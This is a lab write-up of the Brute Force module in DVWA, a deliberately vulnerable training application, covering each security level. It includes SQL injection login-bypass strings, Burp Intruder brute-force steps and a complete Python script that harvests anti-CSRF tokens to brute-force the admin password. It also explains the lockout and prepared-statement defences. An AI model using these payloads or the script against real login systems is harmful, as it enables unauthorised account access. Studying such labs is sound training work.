    
# Tasks-1 of DVMA

## DVWA Sulutions of Brute Force: 
  ## Brute Force 
  ### Low Security Level:
    *   View Source
    *   Find that, only 'Login' will be validated, isset(*) checks whether para* is set and return True/False.
    *   Without any defense of Brute Force, also without any Filter of 'username' and 'password'.
    
#### Method 1: Usage of Burpsuite for Brute Force 
	  * Steps:
		    * 1.1 open Burpsuite (Burpsuite is easy to get/download and install from web).
		    * 1.2 click Proxy, set Intercept off firstly, then click 'open browser' to load the webseite,
		    	   which need to be intercepted.
		    * 1.3 input arbitrary value to login, and Burpsuite will get the info about its.
		    * 1.4 'Ctrl+l' or chose 'Action' as 'Send it to Intruder'.
		    * 1.5 Add password as playload value.
		    * 1.6 Fill the playload set, and start attack.
		    * 1.7 Actually, you will find the response length of the correct password is different as others.
	    
#### Method 2: Sql Injection
	  * 2.1 
		-username：  admin ' or ' 1 ' = ' 1
		-password: (none)
	  * 2.2 
		-username: admin ' #   (#:annotation of rest request sentence.)
		-pass: (none)
            
### Medium Security Level:
  * Different from Low Level, a new function is added.
  
	     * mysql_real_escape_string function, this function will transfer the special symbols, like " ' ", 
	       namely, this function can defence Sql Injection Attack.
	       Thus, the Sql Injection Attack in medium level unfeasible nowly.
	     * but the Brute Force with Burpsuit is still work in this level.
	       (same as low level, see the steps discription of low level)
            
### Highl Security Level:
   * At high level, a function of generation of CSRF Token is added. 
   
           * namely, generateSessionToken(); // Generate Anti-CSRF token  
           * that means, the Request Url will contains a 'user_token' by sending to Server. And the Sever checks the recieved token firstly, if token is valid, then the Server 
             operates the Sql queries.
	     
* To achieve the goal at high security level, we need to write a phython script to brute force the password.
   
* Constuct request to server to get response

		req = urllib.request.Request(url=requrl,headers=header)
		
* Get ' user_token ' , we need to use BeautifulSoup package to read the reponse content, and parser the page to get 'token'
	  
		  soup = BeautifulSoup(the_page,"html.parser")
		  user_token = soup.find('input',{'name':'user_token'})['value']
	   
* Brute force the password by sending request to the server with following URL, which including the param 'user_token' additional

	   	 requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token 
		
* Use the Brupsuite to intercept the whole runtime of python code, we need to set the ProxyHandler of those code, so that, the Proxy is same as Brupsuite's.
      
      	proxy_handler = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'}) ; opener = urllib.request.build_opener(proxy_handler)
          
##### Complete Code is as following:

	from bs4 import BeautifulSoup
	import urllib.request


	proxy_handler = urllib.request.ProxyHandler({'http': '127.0.0.1:8080'})
	opener = urllib.request.build_opener(proxy_handler)


	header = {
		'Host': '192.168.178.34',
			'Cache-Control': 'max-age=0',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'Referer': 'http://192.168.178.34/vulnerabilities/brute/index.php',
			'Accept-Encoding': 'zip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.9',
			'Cookie': 'security=high; PHPSESSID=ra6hjmncufirj8n9qgioejm854'
			}

	requrl = "http://192.168.178.34/vulnerabilities/brute/"

	def get_token(requrl,header):
		req = urllib.request.Request(url=requrl,headers=header)
		response = opener.open(req)
		the_page = response.read()
		soup = BeautifulSoup(the_page,"html.parser")
		print(len(the_page),response.getcode())
		user_token = soup.find('input',{'name':'user_token'})['value']  #get the user_token
		#print(user_token)
		return user_token

	user_token = get_token(requrl,header)

	i=0

	for line in open('test'):
		requrl = "http://192.168.178.34/vulnerabilities/brute/"+"?username=admin&password="+line.strip()+"&Login=Login&user_token="+user_token
		i = i+1
		print(i,'admin',line.strip(),end=" ")
		user_token = get_token(requrl, header)
		if (i == 7):
			break
			
		# because 'test' is only including 7 passwords.
        
        
### Impossible Security Level
* At Impossible Level a 'Lockdown' setting is added. When login has been failed more than 3 times, the 'Login' will be locked for 15 minutes.
* So that we can not no longer to brute force the login process.

		    // Default values
		    $total_failed_login = 3;
		    $lockout_time       = 15;
		    $account_locked     = false;
		    
* Also, 'PDO' defense system is added , and used to prevent from SQL Injection Attack.

		$data->bindParam( ':user', $user, PDO::PARAM_STR );
		
	* Note:
	
		PDO: PHP Data Object. In PDO defense system ,it used pre-statement to prevetion SQL Injection.
		bindParam: bind a php variable to a SQL param.

